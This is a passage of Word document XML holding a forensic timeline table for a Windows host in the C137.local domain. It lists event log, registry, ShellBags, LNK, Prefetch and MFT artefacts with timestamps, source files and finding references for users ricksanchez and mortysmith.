            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6005 | EventLog | The Event log service was started | Computer: DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40276</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, T-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:45.000755</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>nethist: created</w:t>
              <w:br/>
              <w:t>profile_name=C137.local | description=C137.local | dns_suffix=&lt;none&gt; | default_gateway_mac=000c2995cd21 | first_network=C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/network_history.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:45.755000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network: first connected [local time converted to UTC, ActiveTimeBias=420 min]</w:t>
              <w:br/>
              <w:t>C137.local Wired passerelle=00-0C-29-95-CD-21 DNS=&lt;none&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_KnownNetworks.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:50.695343</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4625 | Microsoft-Windows-Security-Auditing | Failed logon | Target: \ | LogonType 3 | FailureReason1: clocks between DC and other computer too far out of sync | FailureReason2: N/A | - | - (-)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38517</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22:43:05.144373</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2020-09-18 21:43:05.9283863 | NewTime: 2020-09-18 22:43:05.1440626 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38518</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:44:12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\ricksanchez\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=87867 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026, T-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:45:26.988114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU</w:t>
              <w:br/>
              <w:t>Network Shares | Network Drive MRU | a=\\CITADEL-DC01\FileShare</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:46:39.873256</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C137\mortysmith | LogonType 2 | LogonId: 0x270257 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38681</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2020-09-18 22:46:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\mortysmith\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=88824 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:46:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\mortysmith\Saved Games</w:t>
              <w:br/>
              <w:t>Directory Saved Games MFT=88818 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026, T-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Desktop\Thoughts.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Thoughts.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:38.408830</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>NOTEPAD.EXE</w:t>
              <w:br/>
              <w:t>runs=6 hash=C5670914 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#79</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\NOTEPAD.EXE-C5670914.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\Plans.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=141</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Plans.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\My Social Security Number.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19.426026</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>size=22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#117827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026, F-031</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.588649</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C137\ricksanchez | LogonType 2 | LogonId: 0x438E75 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-021, F-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.690941</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
